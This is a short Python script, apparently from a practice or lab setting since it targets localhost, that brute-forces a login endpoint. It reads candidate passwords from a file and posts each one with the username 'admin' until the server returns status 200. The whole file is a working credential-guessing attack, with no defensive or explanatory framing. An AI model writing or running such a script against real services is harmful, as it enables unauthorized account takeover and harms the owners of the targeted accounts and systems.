import requests

url = "http://localhost:3000/api/login"
username = "admin"

with open("passwords.txt", "r", encoding="utf-8") as file:
    righe = file.read().splitlines()

for num, riga in enumerate(righe):
    r = requests.post(url, json={"username": username, "password": riga})
    print(f"try {num} - password {riga} - response status code{r.status_code}\n ")
    if "200" in str(r.status_code):
        break
